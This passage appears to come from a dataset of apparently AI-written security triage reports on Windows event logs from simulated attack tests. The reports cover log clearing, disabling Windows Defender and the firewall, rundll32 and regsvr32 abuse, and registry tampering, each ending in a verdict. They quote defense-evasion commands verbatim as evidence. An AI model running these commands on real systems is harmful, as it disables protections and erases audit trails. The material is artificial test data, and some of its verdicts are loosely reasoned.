   - The Sysmon logs show a series of common administrative actions near the same timestamp (`14:05:57` to `14:06:14`). These include HOSTNAME, whoami, and command window activities. While these could be viewed as benign on their own, the specific use of `wevtutil cl System` raises concerns.

### Assessment

- **Indicators of Compromise**: The use of `cmd.exe` to clear system logs using `wevtutil` coupled with the execution of `whoami.exe` suggests potentially suspicious activity.
- **Potential Risk**: The clearing of logs indicates an attempt to remove traces of activity, a tactic commonly used by attackers post-compromise.
  
### Resolution

Based on the analysis, the recommended resolution is:

- **SUSPICIOUS**: The logs contain activities that do not look right, especially the clearing of system logs, indicating the need for further investigation to rule out any malicious intent or unauthorized access.

### Guidance to Proceed

1. **Immediate Actions**:
   - Investigate the context around the execution of `cmd.exe /c wevtutil cl System`. Confirm if these actions were authorized and performed by legitimate administrative users.
   - Analyze any other security logs for correlating activities, especially any successful/unsuccessful login attempts, privilege escalation events, or changes to user accounts.

2. **Further Investigation**:
   - Review user `admin_test` to confirm legitimate activity.
   - Check for any deviations from normal operational patterns on that server.
   - Monitor for any new instances of unexpected command-line invocations, especially cleaning logs or privilege discovery commands.

3. **Considerations**:
   - Ensure logging configurations are not tampered with and enable escalation of alerts for future unexpected `wevtutil` executions.
   - Conduct a detailed incident response if no legitimate context for log clearing is discovered.

If necessary, engage with other teams to validate recent configuration changes or updates that could have triggered this chain of events."
DLP Evasion via Sensitive Data in VBA Macro over email,"Upon reviewing the provided event logs, certain events stand out that could indicate potentially suspicious activity on the Windows host, Server002.

1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - The logs show repeated instances of `wevtutil.exe` and `conhost.exe` being executed by a user identified as `SERVER002\\admin_test`. While `conhost.exe` is commonly associated with command prompt operations, frequent execution alongside `wevtutil.exe`, a tool for managing event logs, might indicate attempts to manipulate or clear event logs, which is considered suspicious behavior.

2. **Execution of PowerShell with Email Sending:**
   - A notable log entry includes the execution of a PowerShell command that utilizes `Send-MailMessage` to send an email with an attachment (`data-cc-macro.xlsm`). This behavior can be suspicious if such activity (sending emails with attachments using PowerShell) is not part of regular operational procedures. It suggests potential data exfiltration, especially given the attachment of a macro-enabled Excel file.

3. **Use of `whoami.exe` and `hostname.exe`:**
   - The use of utilities such as `whoami.exe` (to check the current user context) and `hostname.exe` (to check the system name) indicates an attempt to gather information about the system and user privileges. While these activities can be legitimate, they frequently appear in post-exploitation activities.

4. **High Integrity Level Contexts:**
   - Processes executed with 'High' Integrity Level, especially when associated with privileged administrative accounts, can be suspicious if they are not part of routine administrative tasks.

5. **Security Log Events:**
   - Several security log entries (Event ID 5379) that display unsuccessful attempts to access some credential operations or services further add to the suspicion. The ReturnCode `3221226021` typically indicates an ""Access Denied"" error, which might reveal failed access attempts, though they do not directly indicate a compromise.

### Assessment:
- The combination of PowerShell use for email attachments, frequent use of `wevtutil.exe` with `conhost.exe`, and utility executions (`whoami.exe` and `hostname.exe`) suggests activity that is not characteristic of routine operations, especially coming from an admin account.
- The potential attempt to manipulate logs or query system information, alongside network communication attempts, could be indicative of lateral movement or data exfiltration attempts.

### Guidance:
Given the suspicious nature of these findings, a deeper investigation is warranted.

### Resolution: SUSPICIOUS
- I recommend further investigation to determine the context of these actions:
  - Verify the legitimacy of `admin_test` user's actions and permissions.
  - Check if there is a related incident or internal task involving PowerShell and `wevtutil.exe`.
  - Inspect or isolate the `data-cc-macro.xlsm` file to understand its contents and purpose.
  - Review communication logs to ensure no sensitive data has been compromised.
  - Increase monitoring and consider implementing additional controls around the use of high-integrity accounts and PowerShell scripts on this server."
Rundll32 setupapi.dll Execution,"### Detailed Analysis of the Logs:

#### Sysmon Log Analysis:

1. **PowerShell Usage**:
    - **PowerShell Execution**: There is an event where `powershell.exe` was executed by the user `SERVER002\admin_test`. PowerShell can often be used by attackers for malicious activity due to its powerful scripting capabilities. However, without specific command-line arguments or abnormal execution context, this alone is not definitive evidence of malicious activity.

2. **Conhost & Wevtutil Execution**:
    - A series of `conhost.exe` instances running alongside `wevtutil.exe` are repeated in rapid succession. While `conhost.exe` is a legitimate Windows process associated with console windows, its repeated execution in conjunction with `wevtutil.exe` (an event log manipulation tool) could suggest attempts to clear logs or hide activities, which is suspicious activity, though not enough to claim malicious intent outright.

3. **Cmd.exe and Rundll32.exe Usage**:
    - A significant red flag is the `cmd.exe` process running with the command to execute `rundll32.exe` with an `InstallHinfSection` call. This type of command line is often associated with the installation of potentially malicious INF files. The command involves executing `InstallHinfSection DefaultInstall` from an INF file located in a user’s temp directory, which is a common tactic used in various attacks to run code on a system, suggesting potentially malicious activity.

4. **High Integrity Level Processes**:
    - The processes are running at a high integrity level, indicating administrative privileges, which could imply an escalation of privileges typically associated with targeted system compromise.

5. **Rundll32 with SetupAPI**:
    - The execution of `rundll32.exe` leveraging `setupapi.dll` is common in malicious activities where actors attempt to execute malicious payloads via a trusted Windows binary. This kind of behavior is suspect especially given its location in a temporary directory and the odd naming convention (e.g., `data.011_DefaultInstall.inf`).

6. **Abnormal User Activity**:
    - The activities occurring with the `admin_test` account on `SERVER002` are consistent with those observed in unauthorized access or lateral movement scenarios.

### Summary and Recommendations:

Given these observations, there are strong indicators, particularly the usage of `rundll32.exe` and document paths in the `Temp` directory, that point towards potentially malicious activity. The usage of `wevtutil.exe` in such a pattern could imply efforts to hide tracks by manipulating log files.

### Resolution:

- **Resolution: MALICIOUS**
    - Based on the detailed analysis, the activities observed, particularly involving `rundll32.exe`, and the context of `wevtutil.exe`, suggest an active and likely malicious compromise attempt.
  
- **Actions to Proceed**:
    - Immediately isolate the affected machine `Server002` to prevent further potential spread of the malicious operation.
    - Conduct a deep forensic analysis focusing on file changes, registry modifications, and network traffic to identify any downloaded payloads or scripts executed.
    - Review access logs and credentials used by the `admin_test` account to identify how access was gained or if the credentials have been compromised.
    - Consider the deployment of enhanced monitoring and logging measures on all systems to detect similar activities in the future.
    - Update and run full antivirus and anti-malware scans on all systems to ensure no other system has been impacted.

By taking immediate action, the potential damage or spread of the detected malicious activity can be mitigated."
Event Viewer Registry Modification - Redirection URL,"While reviewing the event logs, several events stand out as potentially suspicious, particularly those involving unusual command-line executions and registry modifications. Here is a breakdown of the analysis:

### Suspicious Activity Detected:

1. **Registry Modification via Command Line:**
   - The command `cmd.exe /c reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer"" /v MicrosoftRedirectionURL /t REG_SZ /d ""file://C:\windows\system32\notepad.exe"" /f` stands out as suspicious.
   - Modifying the registry to redirect URLs in the Event Viewer settings is unusual and typically indicates an attempt to subvert expected system behavior.

2. **Process Launch Patterns:**
   - Frequent executables involved such as `whoami.exe`, `wevtutil.exe`, `conhost.exe` appear in rapid succession which might trigger exploration for privilege or access checks.
   - Execution of `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe` indicates attempts to gather system information or execute commands programmatically.

### Potential Indicators of Compromise
- **Unauthorized Changes:** Modifying registry settings without clear administrative intent or outside of the context of known scripts or system updates could be a sign of compromise.
  
- **Unusual Execution Sequences:** The rapid succession of utility executions (e.g., `wevtutil.exe`) can suggest automated scripts or processes running to evade detection or perform monitored actions efficiently.

- **Privilege Abuse Suspicion:** The actions taken, integrity levels observed, and the context imply potential privilege escalation attempts.

### Analysis Conclusion:
The activities logged indicate potential unauthorized actions that could be related to a script or malware attempt to maintain persistence or evade detection by leveraging existing system utilities and capabilities. 

### Final Assessment:
Given the identified indicators, the activities in the logs should be classified as **SUSPICIOUS**. Further investigation is required to determine the intent behind these activities, particularly the registry modifications, and to verify if they align with any legitimate administrative scripts or if they represent malicious infiltration attempts.

### Recommendations:
- **Incident Response Activation:** Execute a defined incident response protocol to determine the scope of potential compromise.
  
- **Registry Audit:** Conduct an immediate audit of registry changes and associated access logs to identify any unauthorized modifications.

- **System Integrity Review:** Conduct a thorough review of system and network integrity, including scanning for malware or rogue changes and considering tools that could subvert typical alert mechanisms.

- **User Activity Logs:** Correlate user activity with these logs to assess if there are any unexpected or unauthorized user actions coordinated with these system changes.

The findings suggest heightened vigilance is required, and further analysis and monitoring will be crucial to assessing the extent and impact of these logged activities."
Activate Windows NoFileMenu Group Policy Feature,"Upon detailed analysis of the provided Windows event logs, several points of interest can be highlighted:

1. **System and Time Change Events:**
   - Multiple `EventID: 1` and `EventID: 24` from ""Microsoft-Windows-Kernel-General"" show time adjustments made by the `svchost.exe` process. While time changes can be indicative of malicious activity (e.g., timestomping), in this context, they appear related to system time synchronization (`EventID: 35` by ""Microsoft-Windows-Time-Service""). The lack of additional context or subsequent suspicious activity tied directly to this suggests benign behavior.

2. **Security Events:**
   - `EventID: 4672` and `EventID: 4624` show a user `admin_test` acquiring special privileges and logging on using NTLM, from a remote workstation `DESKTOP-3HL5B2P`. While the presence of privileges such as `SeDebugPrivilege` could potentially be concerning, without accompanying evidence of misuse or unexpected activity, it could simply reflect an authorized action. However, remote logins with administrative privileges merit further scrutiny to confirm legitimacy.

3. **Sysmon Events:**
   - Sysmon captures various command-line executions by `admin_test`, including `whoami.exe` and `cmd.exe` with registry manipulation commands. The `cmd.exe` command that modifies a registry setting (""NoFileMenu"") from a command executed by `admin_test` raises some suspicion as it may indicate an attempt to alter user interface settings or policies.
   - The execution of `cmd.exe` to alter the registry involving potentially restrictive settings, especially with high integrity level permissions, is typically unusual in regular operations without a clear administrative purpose.
   - Subsequent executions involving Microsoft Edge updates (which are generally routine) appear systematic and match expected product behavior — the integrity level and command lines support this.

**Assessment and Resolution:**
- The notable activities largely revolve around administrative-level changes and process executions from `admin_test`. The registry change attempt (`cmd.exe` entry) is the most suspicious due to alterations it makes, possibly indicating targeted system configuration changes that might not align with standard operational procedures for `admin_test`.
- Despite legitimate appearance in some logs, combined behaviors could lean towards potential misuse or unplanned administrative actions.

**Resolution: SUSPICIOUS**

**Guidance:**
- Confirm the legitimacy of `admin_test` activities with the respective user or team, focusing on the intention behind the registry changes and remote access.
- Review policy around remote access to administrative accounts and privilege assignments.
- Implement monitoring for potential follow-up activities or similar patterns. Further investigation is needed, particularly focusing on the motive and legitimacy of the registry command, to rule out malicious intent or insider threats."
Modify EnableNonTPM Registry entry,"Upon careful review of the provided log entries, several observations can be made:

1. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - `wevtutil.exe` is a legitimate system utility used to manage event logs. It appears multiple times across the logs executed by the user `SERVER002\admin_test`. This could be normal administrative behavior. However, if there is no known activity associated with administrative tasks during this period, it might indicate an attempt to manipulate or clear event logs, potentially hiding malicious activities.
   - `conhost.exe` is another legitimate Windows binary used in the console window process; its repeated appearance here, nested with `wevtutil.exe`, can be a normal console operation or a placeholder for masking other actions.

2. **Execution of `cmd.exe` with a Registry Change Command:**
   - The execution of `cmd.exe` with a command to modify the registry key `HKLM\SOFTWARE\Policies\Microsoft\FVE` to enable `EnableNonTPM` is suspicious. This key is related to BitLocker, and its modification could indicate a potential attempt to weaken system encryption policies. Such changes should be verified against authorized system changes.
   - This activity shows an intent to modify system-wide security settings, often a tactic used by attackers to maintain persistence or weaken security postures.

3. **Invocation of System Utilities (`HOSTNAME.EXE`, `whoami.exe`):**
   - Commands like `HOSTNAME.EXE` and `whoami.exe` are often used to gather information about the system and currently logged-in users. This activity can be normal; however, it can also be seen when an attacker is trying to understand the context of the compromised system for further exploitation.

4. **Execution Context and User:**
   - All suspicious activities mentioned involve the user `SERVER002\admin_test` with a high integrity level. This indicates the user has administrative privileges, which elevates the potential risk if these actions are unauthorized.

Based on these observations, while some activities like checking the hostname and user sessions might be benign or used in scripts, the registry modification command is indicative of potentially unwanted or malicious actions aiming to reduce security measures.

**Resolution: SUSPICIOUS**

- **Assessment**: 
  - The activities observed regarding registry changes related to BitLocker policies are suspicious and warrant further investigation. This particular behavior could signify attempts to modify security configurations, which should be reviewed for legitimacy.
  - The frequent invocation of `wevtutil.exe` with potential obfuscation intentions using `conhost.exe` for process handling needs verification to ensure no logs are being tampered with or deleted maliciously.

**Recommendations on How to Proceed**:
- **Verification**: Cross-reference these log entries with any authorized change requests or administrative activities to determine if these actions are planned or rogue.
- **Audit**: Conduct a more comprehensive audit of the `SERVER002\admin_test` account's activity and any recent changes to user permissions.
- **Immediate Action**: If unauthorized activity is confirmed, consider isolating the system to prevent potential lateral movement and further policy weakening.
- **Forensic Investigation**: Employ more forensic tools to look at deeper indicators of compromise, including file modification times, additional network traffic analysis, and potential unauthorized access attempts correlating with these logs.
- **Review Encryption Policies**: Specifically examine changes to encryption policies potentially made by the command observed and restore secure settings if unauthorized changes were made."
Tamper with Windows Defender Command Prompt,"After analyzing the provided Windows event logs, the following observations and assessments have been made:

### Suspicious and Potentially Malicious Activity Identified:

1. **Process Terminations and Command Execution:**
   - In the Sysmon logs, there is a sequence where `cmd.exe` is launched with the following command: `""cmd.exe"" /c sc stop WinDefend & sc config WinDefend start=disabled & sc query WinDefend`.
   - This command attempts to stop and disable the Windows Defender service (`WinDefend`). Disabling security tools, such as Windows Defender, is a common tactic used by malware and attackers to avoid detection and resistance.

2. **Process Executions by `admin_test`:**
   - The user `SERVER002\\admin_test` executed a series of potentially sensitive Windows system utilities and commands (`wevtutil.exe`, `conhost.exe`, `whoami.exe`), culminating in the execution of `cmd.exe` with administrative intent. Such sequences could be indicative of a script or tool attempting to escalate privileges or conduct reconnaissance within the system.

3. **Edge Update Service:**
   - While there are numerous entries regarding `MicrosoftEdgeUpdate.exe`, these do not appear inherently suspicious on their own, as they match with typical system and browser update behavior. However, given the surrounding context, they warrant closer inspection to rule out abuse by a malicious actor (e.g., using legitimate processes as cover for malicious activity).

4. **Time Modification Events:**
   - There are multiple time modification events (`EventID: 4616` and `EventID: 1` in the system log) identified on `Server002` executed by `svchost.exe`. Such activity, if unexpected, could indicate attempts to manipulate system time, potentially to evade detection mechanisms based on timelines or delays.

### Assessment:

The presence of the specific command to disable Windows Defender is particularly concerning. While some legitimate software may require disabling some protections for installation, it is generally suspicious, especially without accompanying manufacturer specifications or release notes.

Given this potential threat and the context of administrative user actions involving various system tools, it can be inferred that there is a high likelihood of intentional malicious activity.

### Resolution:
- **MALICIOUS**: The logs contain activity that strongly indicates malicious intent, specifically the command to stop and permanently disable the Windows Defender service. Immediate action is necessary to further investigate the user account `admin_test`, check for unauthorized access or configuration changes, and ensure system security measures are reinstated and maintained.

### Guidance:

1. **Immediate Actions:**
   - **Re-enable Windows Defender:** If it is not currently running, restart the service, and ensure it is configured to start automatically.
   - **Isolate the System:** Temporarily isolate Server002 from the network to prevent further potential spreading of malicious activity.
   - **Conduct a Deep Scan:** Use updated antivirus and endpoint detection tools to scan for additional signs of compromise.

2. **Further Investigation Actions:**
   - **Review User Activities:** Inspect recent activities, logins, and the history of the `admin_test` user. Verify whether any activities are consistent with legitimate administrative maintenance.
   - **Network Traffic Analysis:** Examine recent network logs for unusual outbound or inbound connections which may align with data exfiltration or command-and-control communication.
   - **Log Correlation and Timeline Analysis:** Assemble a timeline of events leading to and from the suspicious activities for a complete picture of potential intrusion.
   - **Update and Patch Management:** Ensure all software on the system and network is current to prevent exploitation of known vulnerabilities.

3. **Long-term Recommendations:**
   - **Enhance Security Monitoring:** Implement and fine-tune threat detection and response tools for faster identification and response to similar incidents.
   - **User Education and Access Review:** Conduct training on recognizing potential security threats and review user access rights to ensure they align with job responsibilities.

The coordinated steps will assist in mitigating current threats while strengthening defenses against future ones."
Allow RDP Remote Assistance Feature,"#### Analysis:

1. **Windows System Logs:**
   - **Time Change Events (EventID: 1, 24):** 
     - There are entries indicating time adjustments. The time setting changes seem to be handled by svchost.exe, associated with Microsoft Windows services. This could be normal behavior as Windows periodically synchronizes time; however, frequent alterations could be indicative of obfuscating activities.
     - **Notable Detail:** The time is altered backward, which is less common but can happen due to timezone adjustments or clock drift corrections.

2. **Sysmon Logs:**
   - **Process Creations:**
     - Execution of `cmd.exe` with a command to modify the registry: `reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fAllowToGetHelp /t REG_DWORD /d 1 /f`.
     - This registry change enables remote assistance, which could be concerning if not part of authorized administrative activities.
     - **Log Entries:** Frequent initiation of `wevtutil.exe` and `conhost.exe`, which are common Windows processes, observed under user `admin_test`, signifying possible script or automated task activity.
     - The creation of processes like `whoami.exe` and `hostname.exe` are typically used for reconnaissance or system information gathering, which could be routine or could suggest unauthorized behavior if context is suspicious.

3. **Security Logs:**
   - **Time Change Logs (EventID: 4616):**
     - Similar to the System logs, these time change logs corroborate the actions seen in the other log entries, involving `svchost.exe` run by `LOCAL SERVICE`. This can be typical behavior unless used to cover tracks.

4. **Application Logs:**
   - The record related to the Software Protection Platform is a usual scheduled check related to licensing and activation, with no signs of anomaly.

#### Assessment & Resolution:

- **Suspicious Activity:**
  - The registry modification is a potential risk, indicating that remote assistance was enabled through `cmd.exe`. This change could provide unauthorized access or persistence if not conducted by an authorized admin.
  - Frequent launch of `wevtutil.exe` alongside other utilities under a single user session suggests possible scripting. It requires context verification about scheduled tasks or administrative scripts.
- **No Explicit Malicious Code Detected:**
  - While these behaviors raise suspicion, there’s no direct indicator confirming outright malicious activity. It might reflect unusual but legitimate administrative activity.

#### Recommendations:

- **Verify Authorization:**
  - Confirm whether the registry change and process executions were sanctioned and conducted by an authorized IT personnel or service.
- **Audit Remote Access:**
  - Review remote access logs and validate security policies around user `SERVER002\admin_test`.
- **Monitor for Persistence:**
  - Ensure that registry changes are monitored and audited regularly.
- **Reinforce Time Sync Policies:**
  - Check and enforce time synchronization settings to prevent any exploitation related to time changes.

**Resolution: SUSPICIOUS** - Due to unauthorized looking registry changes and process activities that require further investigation to rule out potential compromise."
Remove Network Share,"Upon reviewing the event logs provided, I've identified several activities and processed them for any signs of malicious behavior.

### Analysis

1. **Security Logs:**
   - Events 4616 indicate minor time adjustment activities typically managed by the system's time service via `svchost.exe`. The user context is `LOCAL SERVICE`. This adjustment, especially if it is minimal, is customary for time synchronization and not necessarily suspicious by itself.

2. **Application Logs:**
   - The application log concerning `edgeupdate` and Software Protection Platform Service shows service stop/start activities. Typically, this is expected behavior related to regular system and application updates.

3. **Sysmon Logs:**
   - Multiple processes related to `MicrosoftEdgeUpdate.exe` under `NT AUTHORITY\SYSTEM` were initiated. While updating software is regular maintenance, the extent and rate here suggest a thorough update process for Microsoft Edge components with multiple execution paths.
   - A `cmd.exe` execution with a command to delete a network share (`net share \\test\share /delete`). Process executions involving network share modifications require caution. However, the action on itself doesn't signify malicious behavior without additional context showing unauthorized access or unwanted changes.
  
4. **Noteworthy:**
   - Processes such as `wevtutil.exe` and `wsmprovhost.exe` were also executing, which could be typical for administration or management tasks on the server.
   - Execution of processes like `hostname.exe` and `whoami.exe` could suggest administrative checks, likely benign unless part of a pattern of privilege escalation.

### Assessment

Most of the activities look somewhat routine and typical for system and software update functionality. The mass execution of processes such as `MicrosoftEdgeUpdate.exe` may initially flag alert, but this reflects a software update's normal behavior.

### Recommendation

The analysis results indicate these are likely routine activities, though the command-line executions that involve `cmd.exe` to delete network shares warrant a second look if they are unintended and occurred without visibility or authorization by an administrator.

**Resolution:**

**Benign** - The activities observed in the logs appear to be benign routine maintenance and updates for the server environment, and no clear indicators of compromise are present based on the evidence provided."
Regsvr32 Registering Non DLL,"After reviewing the provided Sysmon, Security, System, Application, and Windows PowerShell logs, the following analysis is presented:

### Analysis Findings:

1. **CMD.exe Processes Execution**:
   - Multiple instances of `cmd.exe` are observed. These processes execute command-line operations that involve file existence checks and file copying.
   - Example Command Execution:
     - `cmd.exe /c if exist %%temp%%\\shell32.jpg ( exit 0 ) else ( exit 1 )`
     - `cmd.exe /c copy ""C:\\Windows\\System32\\shell32.dll"" ""%%temp%%\\shell32.jpg""`
     - `cmd.exe /c C:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg`
   - The copying of a system file (`shell32.dll`) to a temporary directory and subsequently attempting to register it using `regsvr32.exe` is highly suspicious. This can be an indicator of a potential DLL side-loading or execution from a non-standard location.

2. **Conhost.exe Observation**:
   - Consistently observed as a child process of `cmd.exe`. This process is typical as it provides command-line interfaces for the executed commands.

3. **Use of `regsvr32.exe`**:
   - `regsvr32.exe` is used to register a shell32.jpg file, which is suspicious due to the file type being typically a DLL, not a JPG. This indicates a possible attempt to disguise malicious operations.

4. **Process Integrity Levels**:
   - All observed processes run with a High integrity level, indicating elevated privileges.

5. **Repeated Use of `wevtutil.exe`**:
   - Instances of `wevtutil.exe` suggest that system logs might be being manipulated, possibly to cover tracks after malicious activities.

### Indicators of Malicious Activity:

- **Suspicious File Operations**: 
  - Copying and registering a system DLL as a JPEG is highly indicative of evasion or persistence techniques.
  
- **Use of Native Tools**:
  - Leveraging tools like `cmd.exe`, `regsvr32.exe`, and `wevtutil.exe` is common in living-off-the-land techniques used by adversaries to blend into normal operations and evade detection.

- **High Integrity Level**:
  - The usage of high integrity suggests privilege escalation or actions performed by an administrative account.

### Resolution:

- **SUSPICIOUS**: 
  - The activities observed in the logs indicate patterns associated with malicious behavior but require further investigation to confirm. The use of several obfuscation techniques and the operational context of the executed commands suggest possible malicious intent.

### Guidance and Next Steps:

1. **Immediate Actions**:
   - Isolate the host `Server002` from the network to prevent potential lateral movement.
   - Perform memory analysis and dump analysis of the processes involved.
   - Verify the legitimacy of files `shell32.dll` and `shell32.jpg` in the `C:\Users\ADMIN_~1\AppData\Local\Temp\` directory.

2. **Further Investigation**:
   - Check for any scheduled tasks or startup items set by the adversary for persistence.
   - Review other systems for similar patterns to rule out broader compromise.

3. **Monitoring and Reporting**:
   - Set up enhanced logging and alerting rules for abnormal process creation, especially involving cmd.exe with unusual command lines.
   - Document findings and actions taken for reporting and audit purposes.

4. **User Awareness**:
   - Educate the administrative staff regarding secure practices to avoid elevated account misuse.

In conclusion, while the activities are suspecting potential compromise, thorough investigation and analysis are necessary to confirm the malicious nature."
LockBit Black - Unusual Windows firewall registry modification -Powershell,"### Analysis:

Upon reviewing the available logs, several points stand out as indicators for possible suspicious or malicious activity:

1. **PowerShell Activity:**
   - The logs demonstrate the execution of PowerShell scripts, specifically one that modifies the registry keys associated with Windows Firewall settings:
     ```
     New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
     New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile"" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
     ```
   - This modification effectively disables the firewall, which is a common technique used by attackers to allow unrestricted traffic into a system. The fact that this was executed under the context of `SERVER002\admin_test` with a high integrity level is further concerning, as it suggests that administrative privileges were utilized.

2. **Processes Execution:**
   - Several Sysmon events (Event ID 1 – Process Create) logged the execution of various command-line utilities (`wevtutil.exe`, `hostname.exe`, `whoami.exe`), which could be part of normal administrative tasks, but also part of post-exploitation activities. The usage context and sequence relative to PowerShell commands is important.
   - Processes `wevtutil.exe` and `conhost.exe` being executed by `admin_test` user in quick succession could suggest an automated script and raises suspicion. 

3. **Service and Application Updates:**
   - Multiple events tied to `MicrosoftEdgeUpdate.exe` seem indicative of a legitimate update operation. However, the frequency and timing warrant a second look to ensure these are not masquerading as normal to execute other commands or payloads.

4. **Lack of Security Logs:**
   - The absence of security log entries is unusual, especially on systems with administrative PowerShell commands being executed. Security logs are essential for correlating authentication and access control anomalies.

### Assessment:
Based on the logs provided, disabling the firewall via PowerShell without a clear, justifiable reason is a strong indicator of suspicious activity. While some processes like `wevtutil.exe` could be benign under specific circumstances (e.g., system administrators conducting audits), combined with unauthorized registry modifications, they increase risk levels.

### Threats/Risks Identified:
- Potential unauthorized access or misuse of administrative privileges.
- Firewall disabled, increasing risk for lateral movement and unauthorized access to or from this host.
- Lack of standard security logging makes it hard to verify legitimate access or changes.

### Guidance on how to proceed:
- **Validation:** Verify whether this PowerShell script execution was authorized and aligned with IT policies. 
    - If part of legitimate administrative operations, ensure it's documented.
- **User Verification:** Validate the access and role of `SERVER002\admin_test`—confirm if this user should have such capabilities and access.
- **Log Correlation:** Retrieve any missing security logs or backups to give complete visibility; analyze for any associated unauthorized logons or privilege escalations.
- **Review Update Process:** Confirm `MicrosoftEdgeUpdate.exe` operations match organizational update schedules and profiles for anomalies.
- **Enhance Monitoring:** Implement or verify systems are adequately monitoring for unauthorized scripting and firewall policy changes.
  
### Final Resolution:
Based on the findings and absence of justifiable context or authorization:

- **SUSPICIOUS** - The logs contain activity that does not look right and requires further investigation to confirm or dismiss the potential security issue."
Take ownership using takeown utility,"Upon analyzing the provided Windows event logs, here's a detailed assessment:

1. **Security Log (Event ID 4616):**
   - The security log entries indicate an update to the system time through the `svchost.exe` process by `LOCAL SERVICE`. Changing system time can be used in attempts to deceive logging mechanisms or align time with a malicious actor's setup. However, updates made by `svchost.exe` and within a legitimate cycle may not be immediately suspicious.

2. **System Log (Kernel-General and Time-Service):**
   - The system logs show Kernel-General (Event ID 1 and 24) and Time-Service (Event ID 35) activities related to the time change. These appear correlated with the security events mentioned above, suggesting a potential legitimate time synchronization action with ""time.windows.com"".

3. **Application Log (edgeupdate):**
   - The `edgeupdate` events reflect normal behavior of a service stop. No immediate indicators of malicious activity here.

4. **Sysmon Log (Event ID 1, 5):**
   - **Process Creation & Monitoring:** Several cmd.exe activities, initiated by user `SERVER002\admin_test`, involve creating directories, taking file ownership, and running system utilities (`hostname.exe`, `whoami.exe`) which can be suspicious if unexpected.
   - **Unusual Process Executions:**
     - The usage of `takeown.exe` from a temporary directory can be indicative of privilege escalation attempts or file manipulation.
     - Repeated use of `wevtutil.exe`, `cmd.exe`, `conhost.exe`, and `takeown.exe` suggests potentially automated script activity.
   - **Microsoft Edge Update Activities:** Multiple entries showing installations and updates of Microsoft Edge components. Whilst on face value may appear benign, unusual timings or frequencies can suggest abuse for persistence.

5. **Anomalous Behavior:**
   - **Temp Directory Use for Executables:** The use of `takeown.exe` from a temporary directory and the construction of takeown folders likens to rebellious access, indicating elevating privileges or script automation.
   - **Predominant High Integrity Level:** High integrity levels of `cmd.exe` processes initiated by the user imply elevated permissions, which might not be necessary for all regular tasks.

### Conclusion

Based on the analysis of the logs, the activities involving `takeown.exe` and temp directory manipulations warrant some concern. However, the absence of recognizable artifacts linking these behaviors to known malware or exploits renders a definitive conclusion of compromise challenging. The repeated process execution and privileged actions suggest automated scripts, potentially aligning with legitimate administrative tasks.

**Final Resolution: SUSPICIOUS**

Further investigation is needed by:
- Reviewing relevant authorizations or scheduled scripts for that user.
- Checking the context of specific process creation, and whether they were expected or sanctioned.
- Considering additional inputs like file hashes, context on updates, or behavioral detection tools for deeper anomalies.

Analyze if legitimate system management accounts or processes align with this behavior. Perform deeper inspection or involve threat intelligence for refined clarification on individual entries or scripts in question."
Tamper with Windows Defender Registry - Reg.exe,"After conducting a detailed review of the provided logs, the following points are observed:

1. **Windows Defender Deactivation:**
   - Multiple entries reflect that Windows Defender was turned off (`SECURITY_PRODUCT_STATE_OFF`) on `Server002` at timestamps around `2024-10-28 10:11:09`.
   - This deactivation could be intentional or indicative of malicious activities aimed at disabling security software.

2. **Suspicious Command Execution:**
   - A Sysmon event identifies the execution of `cmd.exe` with commands that essentially disable numerous defenses of Windows Defender through registry modifications. These include disabling AntiVirus, AntiSpyware, and Real-Time Protection. The command line used is particularly complex and systematic, which could suggest automation or scripting typical of malware.
   - The specific command line arguments used in this action strongly indicate a deliberate attempt to disable security features on the host.

3. **Execution of Several System Utilities:**
   - The consistent execution of system utilities like `wevtutil.exe`, `conhost.exe`, and `reg.exe` by the user `SERVER002\admin_test` could be indicative of scripted or unauthorized access.
   - The use of `wevtutil.exe` indicates potential log manipulation or querying, though not inherently malicious without more context.

4. **Time Manipulation:**
   - Multiple entries show adjustments to the system time. Such behavior can be associated with anti-forensic measures to obscure log traces or confuse investigators.

5. **Edge Update Activity:**
   - There is a flurry of activities related to `MicrosoftEdgeUpdate.exe`, with multiple executions and installations reflected. While updates themselves are normal, the context and concurrent disabling of security controls necessitate more scrutiny.

6. **Security Audit Logs:**
   - The security logs show time changes initiated by a service running under `NT AUTHORITY\\LOCAL SERVICE` via `svchost.exe`.

Based on the analysis:

- **Resolution: MALICIOUS**
  - The confluence of disabling security features via system registry modifications and the deactivation of Windows Defender alongside it unmistakably suggests malicious activity.
  - Immediate actions are recommended to isolate `Server002`, conduct a deeper forensic investigation, and restore Windows Defender and other security measures.
  - Further analysis may involve identifying how the malicious commands were deployed (e.g., via script, insider threat, external compromise) and ensuring any malicious residues or backdoors are eradicated."
DLP Evasion via Sensitive Data in VBA Macro over HTTP,"Based on the analysis of the provided logs, I have identified a few key points of interest which indicate potentially suspicious or anomalous behavior:

1. **Time Manipulation**: The security and system logs show events related to time changes (Event ID 4616). This is typically benign when related to synchronization services or daylight saving adjustments. However, frequent changes and inconsistencies, especially around critical activities, could suggest attempts at misdirection or obfuscation.

2. **Use of PowerShell**: There are multiple instances of PowerShell usage (Event ID 600 and Sysmon logs), notably with a `powershell.exe` command invoking `Invoke-WebRequest` directed at `127.0.0.1` and handling a file path `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data-cc-macro.xlsm`. This is unusual and could signify either a legitimate data handling operation or a malicious script execution, potentially involving exfiltration or data staging.

3. **Privilege Use (Event ID 4672)**: The user `admin_test` was granted multiple high-level privileges like `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which can allow significant control over the system. This is expected for administrative operations but should be closely inspected if unexpected.

4. **NTLM Authentication**: An Event ID 4624 logon using NTLM (commonly used for local or remote logons) was observed. While not inherently suspicious, the combination with potentially anomalous activity can warrant attention.

5. **Process Creation**: Frequent execution of `whoami.exe` found in Sysmon logs can indicate reconnaissance activities, although it can also be legitimate administrative behavior.

